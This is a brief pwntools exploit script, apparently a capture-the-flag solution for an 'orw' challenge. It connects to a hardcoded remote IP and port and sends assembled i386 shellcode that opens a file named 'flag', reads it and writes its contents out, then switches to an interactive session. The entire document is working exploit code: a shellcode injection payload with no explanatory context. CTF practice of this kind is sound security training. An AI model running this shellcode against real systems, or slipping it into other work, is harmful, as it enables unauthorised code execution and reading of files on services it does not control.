from pwn import *

#r = process("./orw")
r = remote("106.15.186.69",50003)

context.log_level = "DEBUG"

shellcode = '''start:jmp xx;yy:pop ebx;mov eax, 0x05;mov ecx, 0;mov edx, 0;int 0x80;push eax;jmp zz;xx:call yy;.string \"flag\";zz:pop ebx;mov eax, 0x03;sub esp, 0x30;mov ecx, esp;mov edx, 0x30;int 0x80;mov eax,0x04;mov ebx, 0x1;mov ecx, esp;mov edx, 0x30;int 0x80;\n'''

payload = asm(shellcode, arch="i386")

print r.recv()
r.send(payload)
r.interactive()



